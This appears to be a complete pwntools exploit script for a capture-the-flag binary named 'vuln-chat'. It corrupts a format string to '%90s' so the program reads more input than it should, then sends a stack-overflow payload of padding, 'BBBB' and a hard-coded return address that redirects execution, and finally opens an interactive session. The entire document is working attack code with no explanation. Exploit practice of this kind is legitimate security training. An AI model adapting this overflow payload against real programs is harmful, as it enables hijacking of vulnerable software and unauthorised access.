from pwn import *

r = process("./vuln-chat")

# changing the format parameter
r.sendline("A" * 20 + "%90s")
r.sendline("A" * 45 + "BBBB" + p32(0x804856b))

r.interactive()